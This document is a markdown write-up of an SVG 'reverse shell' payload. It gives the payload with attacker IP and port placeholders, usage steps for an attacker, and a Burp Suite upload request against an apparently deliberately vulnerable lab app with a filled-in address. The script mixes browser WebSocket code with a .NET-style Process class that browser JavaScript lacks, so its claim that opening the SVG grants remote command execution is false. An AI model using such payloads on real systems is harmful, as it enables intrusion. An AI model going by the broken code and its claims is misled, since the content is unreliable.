# SVG Payload:

```
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var host = 'Attacker_IP';
    var port = 'Attacker_Port';

    var s = new WebSocket('ws://' + host + ':' + port);
    s.onopen = function() {
      var proc = new Process();
      proc.StartInfo.FileName = 'cmd.exe';
      proc.StartInfo.RedirectStandardInput = true;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.StartInfo.UseShellExecute = false;
      proc.Start();
      var input = proc.StandardInput;
      var output = proc.StandardOutput;

      s.onmessage = function(event) {
        input.WriteLine(event.data);
      };

      setInterval(function() {
        var outputData = output.ReadToEnd();
        s.send(outputData);
      }, 100);
    };
  </script>
</svg>
```
## **Usage**: To use this payload, an attacker would:

- Replace `'Attacker_IP'` and `'Attacker_Port'` with the actual IP address and port of the attacker machine.

Upon opening the SVG file, the victim machine would establish a WebSocket connection to the attacker's server, enabling the attacker to execute commands on the victim's machine remotely.

## Example usage of the payload inside Burpsuite against Vulnerable Light App:
### Endpoint used:
- /Patch: Used to upload .svg files
- /Dns: Perform a DNS query for the Fully Qualified Domain Name (FQDN) passed as a parameter (`UserStr`). (Can be exploited by adding a '&' and executing our payload)

### Burpsuite PATCH request:
```
PATCH /Patch?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImFkbWluIiwibmJmIjoxNzE0NjM3MjQ4LCJleHAiOjE3NDYxNzMyNDgsImlhdCI6MTcxNDYzNzI0OH0.0PjIKh8uqvHuxo1D1-JXWaq30JDXvNSfbUfKMcJ9f2o HTTP/1.1
Host: localhost:4000
Connection: keep-alive
Content-Length: 961
sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY3yVHB1BGhc61AgN
X-Forwarded-For: 10.10.10.256
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-GPC: 1
Accept-Language: fr-FR,fr
Origin: https://localhost:4000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://localhost:4000/swagger/index.html
Accept-Encoding: gzip, deflate, br

------WebKitFormBoundaryY3yVHB1BGhc61AgN
Content-Disposition: form-data; name="file"; filename="pocXSS.svg"
Content-Type: image/svg+xml
  
    var host = '192.168.1.134';
    var port = '4444';

    var s = new WebSocket('ws://' + host + ':' + port);
    s.onopen = function() {
      var proc = new Process();
      proc.StartInfo.FileName = 'cmd.exe';
      proc.StartInfo.RedirectStandardInput = true;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.StartInfo.UseShellExecute = false;
      proc.Start();
      var input = proc.StandardInput;
      var output = proc.StandardOutput;

      s.onmessage = function(event) {
        input.WriteLine(event.data);
      };

      setInterval(function() {
        var outputData = output.ReadToEnd();
        s.send(outputData);
      }, 100);
    };
------WebKitFormBoundaryY3yVHB1BGhc61AgN--
```

## SVG Payload Explanation

This SVG payload is designed to create a reverse shell connection from a victim machine (eg. web-server) to an attacker-controlled server. Below is an explanation of how the payload works:

1. **SVG Declaration**: The payload starts with the XML declaration `xmlns="http://www.w3.org/2000/svg"`, indicating that it's an SVG (Scalable Vector Graphics) file.
    
2. **JavaScript Payload**: The payload contains JavaScript code embedded within a `<script>` element. This JavaScript code performs the following actions:
    
    - **Setting Up Connection Parameters**: It initializes variables `host` and `port` with the attacker's IP address and the port number where the attacker's WebSocket server is listening.
        
    - **WebSocket Connection**: It creates a WebSocket connection (`ws://`) to the attacker's server using the specified host and port. The `onopen` event handler is triggered when the connection is successfully established.
        
    - **Executing Command Shell**: Upon connection establishment, it creates a new process (`cmd.exe` for Windows) on the victim's machine. This process is configured to redirect standard input and output streams to allow interaction with the command shell.
        
    - **Handling Input and Output**: It sets up event handlers to handle incoming messages (`onmessage`) from the WebSocket server and periodically send the output of the command shell (`cmd.exe`) back to the attacker's server. This enables bi-directional communication between the attacker and victim machines.
        
    - **Interval for Output Sending**: To continuously send the command shell's output to the attacker, it sets up an interval function (`setInterval`) that periodically reads the output of the command shell and sends it over the WebSocket connection.
        
3. **Placeholder Values**: The payload includes placeholder values `'Attacker_IP'` and `'Attacker_Port'` for the attacker's IP address and port. These values should be replaced with the actual IP address and port of the attacker's WebSocket server.

